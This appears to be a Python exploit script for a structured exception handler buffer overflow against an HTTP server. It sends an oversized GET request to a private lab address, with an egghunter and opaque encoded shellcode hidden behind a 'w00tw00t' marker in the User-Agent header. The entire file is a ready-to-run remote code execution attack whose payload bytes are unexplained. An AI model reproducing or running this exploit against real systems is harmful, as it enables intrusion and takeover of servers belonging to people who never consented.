import socket
import os

#Change This -

buf =  ""
buf += "\xdb\xc6\xbf\x3e\x08\xfb\x04\xd9\x74\x24\xf4\x5e\x29"
buf += "\xc9\xb1\x63\x31\x7e\x1a\x03\x7e\x1a\x83\xee\xfc\xe2"
buf += "\xcb\xd3\x2b\xbc\xc9\xb1\xa1\x41\xf4\x4e\x12\x4e\x5d"
buf += "\x84\x93\x1f\x3c\xeb\x60\x77\x3d\xe0\x9b\x74\xf8\xb1"
buf += "\xeb\x72\x7d\xf6\xa6\xa6\x8f\xd9\xa8\xbc\x0b\x1a\x3d"
buf += "\x01\x44\x58\x67\x2c\xcc\xe0\xbe\xe0\x37\x35\xe4\x81"
buf += "\x2d\x78\xe1\xaf\x6c\xe6\xd4\x74\xaa\x95\x5f\x4f\x4c"
buf += "\xd6\x5c\xdb\xd4\xdd\xe1\xbd\x9a\x62\xf5\xa4\xa1\x2d"
buf += "\x5c\x9e\xf8\x1a\x6a\x34\xf4\x9e\x0f\xfe\x1b\x40\x3a"
buf += "\x3a\xea\xfa\x57\xb0\x5a\x1f\x68\x8d\xc6\xd6\xb0\x23"
buf += "\x9b\x83\x46\xea\xbf\xf3\xef\x3c\x70\x05\x15\x47\x0b"
buf += "\xfb\x33\x7e\xf5\xc1\x55\x1f\x3d\x75\xb7\x85\x5f\x32"
buf += "\x7e\x11\xf2\x0b\x39\x3f\x35\xa2\x87\x55\x92\xf3\xb7"
buf += "\xc2\xb6\x88\xfa\x50\x9e\x60\xce\x19\xe8\x72\x27\x79"
buf += "\x85\x41\xf7\x4a\x93\xbe\xbb\x42\x7c\x94\x1e\x67\x3e"
buf += "\x36\x3b\x7f\xe6\x90\x3d\xf0\x8d\xf6\xc5\x81\xbf\x51"
buf += "\x21\xbe\x61\xe4\xf4\xb8\x61\xa6\xbd\x82\xb3\x6a\x32"
buf += "\xb4\x43\x7a\x0b\x88\x0f\xd1\x20\xc9\x73\x35\xce\x3b"
buf += "\xd6\xd4\xc9\x5c\x7c\xb7\xe9\x56\xb3\x2b\xcb\x46\x7d"
buf += "\x36\xdc\x54\x1b\x52\x3f\x67\x4f\xff\x9c\xd8\x21\x5c"
buf += "\x36\x14\x07\x1f\x75\xb4\x04\x31\x20\x5a\x08\x6f\xa8"
buf += "\xba\x99\x32\xdc\x76\x2a\xcd\x50\x5b\x2a\x04\xa8\x29"
buf += "\x39\x0f\xca\x74\xd8\x9d\x1b\xbd\x3e\xcb\x5b\xcf\xef"
buf += "\x40\x5a\xdd\x98\x55\x2d\x5b\x45\x3d\x2e\x0b\xe6\x63"
buf += "\x44\x10\x44\x8a\x5e\xfc\xe5\x27\x75\xe8\x70\x91\x45"
buf += "\x81\x1f\xfb\xb2\xd4\x46\xd0\xd4\x90\x45\x5b\x67\xd1"
buf += "\x14\x07\xb8\x2a\x40\xb0\x7c\x89\xb8\x72\xd1\x5e\xb0"
buf += "\x1d\xb2\xe5\x12\x08\xc1\xaa\xa5\x0e\xc1\x89\x67\xd4"
buf += "\x14\x78\x16\xe1\x0f\xd1\x18\x3b\x4a\x31\x73\xfb\xc1"
buf += "\x13\xf1\xa1\xf9\xed\xc0\xe2\x3f\x48\x3f\x3c\x79\x8d"
buf += "\x96\x09\x1f\x2f\xb6\x11\x40\x36\xd6\x6f\xc3\x50\x77"
buf += "\x18\x7b\x84\xf8\x08\x5e\xd9\x18\x43\x2a\x36\x20\x96"
buf += "\x56\x2e\x2a\xa8\x3e\x55"

#pop pop ret 0x100103fe
NSEH = "\x90\x90\xeb\x06" #Jump short 6 - over our Nopsled
SEH = "\xfe\x03\01\x10"

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"


crash1 = "A"*4061 + NSEH + SEH + "\x90"*5 + egghunter + "\x90"*(5000-406-4-4-5-len(egghunter) )

payload2 = buf

payload = "GET " + crash1 + " HTTP/1.1\r\n"
payload += "Host: 192.168.116.136\r\n"
payload += "User-Agent: w00tw00t" + payload2 + "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.136",80)) 				 #change this
print "[+] Sending payload .. ."
s.send(payload)
s.close()
